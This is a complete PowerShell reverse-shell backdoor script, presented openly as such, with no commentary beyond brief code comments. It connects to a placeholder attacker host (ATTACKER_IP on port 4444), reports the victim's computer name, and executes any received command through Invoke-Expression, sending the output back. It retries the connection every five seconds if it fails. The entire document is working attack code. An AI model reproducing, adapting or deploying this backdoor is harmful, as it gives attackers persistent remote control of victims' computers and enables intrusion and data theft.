# PowerShell Backdoor
# Simple backdoor that connects back to C2 server

$serverIP = "ATTACKER_IP"
$serverPort = 4444

function Invoke-Backdoor {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}
        
        # Send banner
        $banner = "Backdoor connected from " + $env:COMPUTERNAME + "`n"
        $sendbyte = ([text.encoding]::ASCII).GetBytes($banner)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
        
        # Command loop
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            
            try {
                $sendback = (Invoke-Expression $data 2>&1 | Out-String)
            } catch {
                $sendback = $_.Exception.Message
            }
            
            $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        
        $client.Close()
    } catch {
        Start-Sleep -Seconds 5
        Invoke-Backdoor
    }
}

# Start backdoor
Invoke-Backdoor
